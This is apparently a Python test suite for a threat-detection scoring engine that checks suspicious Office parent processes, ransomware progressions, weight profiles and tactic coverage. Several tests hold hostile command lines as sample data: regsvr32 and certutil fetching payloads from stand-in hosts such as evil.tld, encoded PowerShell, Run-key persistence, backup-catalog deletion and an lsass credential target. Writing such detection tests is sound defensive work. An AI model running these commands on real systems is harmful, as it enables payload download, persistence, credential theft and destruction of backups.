"""Tests for Verdict Engine v3.1b — Office LOLBin parents · Progressions ·
Profiles · Score-escalation ladder · Tactic coverage.
"""
from __future__ import annotations
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # /app/backend

from v2.verdict import score, correlate, list_profiles, PROFILES, match_progressions
from v2.shadow.irg import enrich as irg_enrich


# ── Helper ──────────────────────────────────────────────────────────

def _f(fid, ts, lane, label, cmdline="", mitre=None, action=None,
       target=None, rule_id=None):
    return {
        "frame_iid": fid, "ts": ts, "lane": lane, "label": label,
        "action":  action or cmdline or label, "cmdline": cmdline,
        "target":  target, "mitre":  mitre or [], "rule_id": rule_id,
    }


# ═══ Office LOLBin Parents (extended SUSPICIOUS_PARENT) ═══════════════

def test_office_spawns_rundll32_is_suspicious():
    v = score({"lane": "process", "label": "rundll32.exe",
               "cmdline": "rundll32.exe C:\\Users\\Public\\update.dll,Start",
               "entity": {"iid": "ent_rd"}, "parent": {"iid": "winword.exe"},
               "mitre": []})
    signals = {b["signal"] for b in v.breakdown}
    assert "SUSPICIOUS_PARENT" in signals, signals

def test_office_spawns_regsvr32_is_suspicious():
    v = score({"lane": "process", "label": "regsvr32.exe",
               "cmdline": "regsvr32 /s /n /u /i:http://evil.tld/a.sct scrobj.dll",
               "entity": {"iid": "ent_rg"}, "parent": {"iid": "outlook.exe"},
               "mitre": []})
    assert "SUSPICIOUS_PARENT" in {b["signal"] for b in v.breakdown}

def test_office_spawns_certutil_is_suspicious():
    v = score({"lane": "process", "label": "certutil.exe",
               "cmdline": "certutil -urlcache -split http://evil.tld/payload",
               "entity": {"iid": "ent_ct"}, "parent": {"iid": "excel.exe"},
               "mitre": []})
    assert "SUSPICIOUS_PARENT" in {b["signal"] for b in v.breakdown}

def test_office_spawns_notepad_is_NOT_suspicious():
    """notepad is not in the LOLBin list — Office → notepad should be benign."""
    v = score({"lane": "process", "label": "notepad.exe",
               "cmdline": "notepad.exe C:\\readme.txt",
               "entity": {"iid": "ent_np"}, "parent": {"iid": "winword.exe"},
               "mitre": []})
    assert "SUSPICIOUS_PARENT" not in {b["signal"] for b in v.breakdown}


# ═══ Attack Progression matcher ═══════════════════════════════════════

def test_progression_full_ransomware_matches():
    hits = match_progressions(
        signals={"BACKUP_DESTRUCTION", "MASS_FILE_ENCRYPTION", "RANSOM_NOTE_CREATION",
                 "REGISTRY_PERSISTENCE", "OBFUSCATION", "LOLBAS_ABUSE"},
        families={"execution", "persistence", "evasion", "impact"},
        tactics={"execution", "persistence", "defense_evasion", "impact"},
    )
    ids = {h["id"] for h in hits}
    assert "KC_RANSOM_PROGRESSION" in ids, ids

def test_progression_partial_below_threshold_does_not_fire():
    hits = match_progressions(
        signals={"MITRE_OTHER"},
        families={"execution"},
        tactics={"execution"},
    )
    assert hits == [], hits

def test_progression_initial_access_kill_matches_full_chain():
    hits = match_progressions(
        signals={"SUSPICIOUS_PARENT", "LOLBAS_ABUSE", "DOWNLOAD_CRADLE",
                 "REGISTRY_PERSISTENCE", "AMSI_BYPASS", "CREDENTIAL_DUMPING",
                 "MASS_FILE_ENCRYPTION"},
        families={"execution", "persistence", "evasion", "credential", "impact", "network"},
        tactics={"initial_access", "execution", "persistence", "defense_evasion",
                 "credential_access", "impact"},
    )
    ids = {h["id"] for h in hits}
    assert "KC_INITIAL_ACCESS_KILL" in ids


# ═══ Weight Profiles ═════════════════════════════════════════════════

def test_all_six_profiles_registered():
    ids = {p["id"] for p in list_profiles()}
    assert {"soc_balanced", "threat_hunting", "dfir", "high_security",
            "cloud_workload", "ot_ics"}.issubset(ids), ids

def test_profile_default_is_soc_balanced():
    default = [p for p in list_profiles() if p["is_default"]]
    assert len(default) == 1 and default[0]["id"] == "soc_balanced"

def test_profile_dfir_boosts_credential_signals():
    frames = irg_enrich([
        _f("f1", "2026-02-24T10:00:00Z", "process", "unknown.exe",
           cmdline="unknown.exe --target lsass", mitre=["T1003"]),
    ])
    r_soc  = correlate(frames, case_id="p1", profile="soc_balanced")
    r_dfir = correlate(frames, case_id="p1", profile="dfir")
    assert r_dfir.device.score >= r_soc.device.score, \
        f"DFIR should score ≥ SOC on credential signal: {r_dfir.device.score} vs {r_soc.device.score}"

def test_profile_cloud_workload_downweights_registry_persistence():
    frames = irg_enrich([
        _f("r1", "2026-02-24T10:00:00Z", "registry", "reg add",
           target=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\bd",
           mitre=["T1547"]),
        _f("r2", "2026-02-24T10:00:01Z", "process", "cmd.exe",
           cmdline="cmd /c whoami", mitre=[]),
    ])
    r_soc   = correlate(frames, case_id="p2", profile="soc_balanced")
    r_cloud = correlate(frames, case_id="p2", profile="cloud_workload")
    assert r_cloud.device.score <= r_soc.device.score, \
        f"Cloud should score ≤ SOC on Windows registry persistence: {r_cloud.device.score} vs {r_soc.device.score}"


# ═══ Score-escalation ladder ═════════════════════════════════════════

def test_score_escalation_populated_on_device():
    frames = irg_enrich([
        _f("e1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAAAAA",
           mitre=["T1027", "T1059"]),
        _f("e2", "2026-02-24T10:00:05Z", "process", "certutil.exe",
           cmdline="certutil -urlcache -split http://evil/payload", mitre=["T1105"]),
        _f("e3", "2026-02-24T10:00:10Z", "registry", "reg add",
           target=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\bd",
           mitre=["T1547"]),
        _f("e4", "2026-02-24T10:00:15Z", "process", "wbadmin.exe",
           cmdline="wbadmin delete catalog -quiet", mitre=["T1490"]),
    ])
    r = correlate(frames, case_id="esc")
    ladder = r.device.score_escalation
    assert ladder, "device.score_escalation must be populated"
    assert ladder[0]["layer"] == "base"
    # Every step's delta accumulates monotonically until any cap.
    running = ladder[0]["score"]
    for step in ladder[1:]:
        assert step["score"] >= 0 and step["score"] <= 100
    # Progression bonus should appear.
    signals_in_ladder = {s.get("signal", "") for s in ladder}
    assert any(sig.startswith("ATTACK_PROGRESSION_") for sig in signals_in_ladder), \
        f"expected a progression in the ladder; got {signals_in_ladder}"


# ═══ Tactic coverage wheel ═══════════════════════════════════════════

def test_tactic_coverage_populated_on_device():
    frames = irg_enrich([
        _f("t1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AA==", mitre=["T1059", "T1027"]),
        _f("t2", "2026-02-24T10:00:05Z", "process", "certutil.exe",
           cmdline="certutil -urlcache -split http://x/p", mitre=["T1105"]),
        _f("t3", "2026-02-24T10:00:10Z", "process", "unknown.exe",
           cmdline="unknown --target lsass", mitre=["T1003"]),
    ])
    r = correlate(frames, case_id="tc")
    tc = r.device.tactic_coverage
    assert isinstance(tc, dict) and len(tc) >= 3, tc
    # Each entry has techniques + count + level.
    for tac, entry in tc.items():
        assert entry["count"] >= 1
        assert entry["level"] in (1, 2, 3)
        assert isinstance(entry["techniques"], list)


# ═══ End-to-end deterministic profile scoring ════════════════════════

def test_all_profiles_deterministic():
    frames = irg_enrich([
        _f("d1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AA==", mitre=["T1059", "T1027"]),
        _f("d2", "2026-02-24T10:00:05Z", "process", "certutil.exe",
           cmdline="certutil -urlcache -split http://x/", mitre=["T1105"]),
    ])
    for pid in PROFILES:
        first = correlate(frames, case_id="det", profile=pid)
        for _ in range(20):
            r = correlate(frames, case_id="det", profile=pid)
            assert r.device.score == first.device.score, \
                f"profile {pid} non-deterministic: {r.device.score} vs {first.device.score}"


if __name__ == "__main__":
    fns = [(n, f) for n, f in list(globals().items()) if n.startswith("test_")]
    ok, fail = 0, 0
    for name, fn in fns:
        try:
            fn()
            print(f"  ✓ {name}")
            ok += 1
        except AssertionError as e:
            print(f"  ✗ {name} · {e}")
            fail += 1
        except Exception as e:
            print(f"  ✗ {name} · {type(e).__name__}: {e}")
            fail += 1
    print(f"\n{ok}/{ok+fail} passed")
    sys.exit(0 if fail == 0 else 1)
